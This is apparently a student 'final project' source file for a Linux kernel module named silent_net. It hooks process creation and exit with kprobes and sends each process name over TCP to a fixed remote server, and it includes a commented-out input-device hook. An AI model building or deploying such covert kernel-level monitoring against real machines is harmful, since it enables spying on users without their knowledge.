/*
 * This is a source code of the client side
 * Of 'silent_net' project.
 *
 * blah blah blah
 *
 *
 */

#include "headers.h"
#include "protocol.h"
#include "workqueue.h"
#include "tcp_socket.h"

#define HOOK_INPUT_EVENT "input_event"
#define HOOK_PROCESS_EXIT "do_exit"
#define HOOK_PROCESS_FORK "kernel_clone" // Originally named 'do_fork'
					 // Linux newer versions use 'kernel clone'
/* #define HOOK_FILE_OPEN "do_sys_openat", "__sys_sendmsg" - Not used, OS frequently uses this functions
 * 				 	    		     Hooking such function will crash the computer
 */


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omer Kfir");
MODULE_DESCRIPTION("Final project");

static void transmit_data(struct work_struct *work);
static int handler_pre_do_fork(struct kprobe*, struct pt_regs*);
static int handler_pre_do_exit(struct kprobe*, struct pt_regs*);
//static int handler_pre_input_event(struct kprobe*, struct pt_regs*);
static int register_probes(void);
static void unregister_probes(int);

/* Enum of all kprobes, each kprobe value is the index inside the array */
typedef enum {kp_do_fork, kp_do_exit, kp_input_event, PROBES_SIZE} kernel_probes;

/* Kprobes structures */
static struct kprobe kps[PROBES_SIZE] = {0};

/* Global socket variables */
static struct socket *sock; // Socket struct
static bool sock_connected = false; // Boolean value indicating if socket is connected
static struct mutex sock_mutex; // Mutex lock socket handling
static struct workqueue_struct *tcp_sock_wq; // Workqueue for sending tcp socket messages

/* Attemps to send data to server side */
static void transmit_data(struct work_struct *work)
{
	struct wq_msg *curr_msg = container_of(work, wq_msg, work);
	int ret;

    	mutex_lock(&sock_mutex);

    	/* If socket is disconnected try to connect */
    	if ( !sock_connected ) 
    	{
        	/* When a socket disconnects a new socket needs to be created */
        	sock = tcp_sock_create();
        	if ( IS_ERR(sock) ) 
		{
            		sock = NULL;
            		goto end;
        	}

        	ret = tcp_sock_connect(sock, DEST_IP, DEST_PORT);    
        	if ( ret < 0 ) 
		{
            		tcp_sock_close(sock);
            		sock = NULL;
            		goto end;
        	}
		sock_connected = true;
    	}

    	ret = tcp_send_msg(sock, curr_msg->msg_buf, curr_msg->length);
    	if ( ret < 0 ) 
    	{
        	sock_connected = false;
        	tcp_sock_close(sock);
        	sock = NULL;
    	}

end:
    	mutex_unlock(&sock_mutex);
    	kfree(curr_msg);  // Free the work structure
}

/* Fork hook */
static int handler_pre_do_fork(struct kprobe *kp, struct pt_regs *regs)
{
    	char msg_buf[BUFFER_SIZE];
    	size_t msg_length;
	
	if ( !current )
		return 0;
	
	msg_length = protocol_format(msg_buf, "%s~%s", MSG_PROCESS_OPEN, current->comm);
	if ( msg_length > 0)
		workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);

	return 0;
}

/* Process termination hook */
static int handler_pre_do_exit(struct kprobe *kp, struct pt_regs *regs)
{
        char msg_buf[BUFFER_SIZE];
        size_t msg_length;

	if ( !current )
		return 0;
	
	msg_length = protocol_format(msg_buf, "%s~%s", MSG_PROCESS_CLOSE, current->comm);
        if ( msg_length > 0)
                workqueue_message(tcp_sock_wq, transmit_data, msg_buf, msg_length);

        return 0;

}

/* Device input events */
/*
static int handler_pre_input_event(struct kprobe *kp, struct pt_regs *regs)
{
	if ( !regs ) // Checking current is irrelevant due to interrupts
		return 0;

	struct input_dev *dev = (struct input_dev *)regs->di; // First parameter
	unsigned int code = (unsigned int)regs->dx; 	      // Third paramater
	
	printk(KERN_INFO "Device Named: %s | Device code: %d\n", dev->name, code);
	return 0;
}
*/
/* Register all hooks */
static int register_probes(void)
{
	/* ret variable for returning value of init function */
        int ret;

        /* Set up creation of new processes function */
        kps[kp_do_fork].pre_handler = handler_pre_do_fork;
        kps[kp_do_fork].symbol_name = HOOK_PROCESS_FORK;

        /* Registering kprobe, which sets up an interrupt before calling function */
        ret = register_kprobe(&kps[kp_do_fork]);
        if (ret < 0) // Error
        {
                printk(KERN_INFO "Failed to register %s,goodbye\n", kps[kp_do_fork].symbol_name);
                goto end;
        }

        /* Set up termination of process function */
        kps[kp_do_exit].pre_handler = handler_pre_do_exit;
        kps[kp_do_exit].symbol_name = HOOK_PROCESS_EXIT;

        ret = register_kprobe(&kps[kp_do_exit]);
        if (ret < 0)
        {
                unregister_probes(kp_do_exit);
                printk(KERN_INFO "Failed to register %s, bye bye\n", kps[kp_do_exit].symbol_name);
                goto end;
        }

	/* Set up sending message using socket */
	/*
	kps[kp_input_event].pre_handler = handler_pre_input_event;
	kps[kp_input_event].symbol_name = HOOK_INPUT_EVENT;

	ret = register_kprobe(&kps[kp_input_event]);
	if (ret < 0)
	{
		unregister_probes(kp_input_event);
		printk(KERN_INFO "Failed to register %s, banana\n", kps[kp_input_event].symbol_name);
		goto end;
	}
	*/
        printk(KERN_INFO "Finished hooking succusfully\n");
end:
        return ret;

}

/* Unregister all kprobes */
static void unregister_probes(int max_probes)
{
	/* Static char to indicate if already unregistered */
	static atomic_t unreg_kprobes = ATOMIC_INIT(0); // Use atomic to avoid race condition

	/* Check if it has been set to 1, if not set it to one */
	if (atomic_cmpxchg(&unreg_kprobes, 0, 1) == 0)
	{	
		/* Create i variable
		 * While it's not a good practice to 
		 * put it inside of a branch
		 * we want to not create it if already
		 * unregistered devices
		*/
		int i;
		for (i=0;i<max_probes;i++)
		{
			unregister_kprobe(&kps[i]);
		}
	}
}

static int __init hook_init(void)
{
    	int ret = 0;    

    	/* Create workqueue */
    	tcp_sock_wq = create_singlethread_workqueue("tcp_sock_queue");
    	if ( !tcp_sock_wq ) 
	{
        	ret = -ENOMEM;
        	goto end;
    	}

    	mutex_init(&sock_mutex);

    	ret = register_probes();
    	if ( ret < 0 )
        	goto cleanup_wq;

    	return 0;

cleanup_wq:
    	destroy_workqueue(tcp_sock_wq);
end:
    	return ret;
}

static void __exit hook_exit(void)
{
	/* Close safely all module basic objects */
    	flush_workqueue(tcp_sock_wq);
    	destroy_workqueue(tcp_sock_wq);

	tcp_sock_close(sock);
	unregister_probes(PROBES_SIZE);

	printk(KERN_INFO "Unregisterd kernel probes");
}

module_init(hook_init);
module_exit(hook_exit);
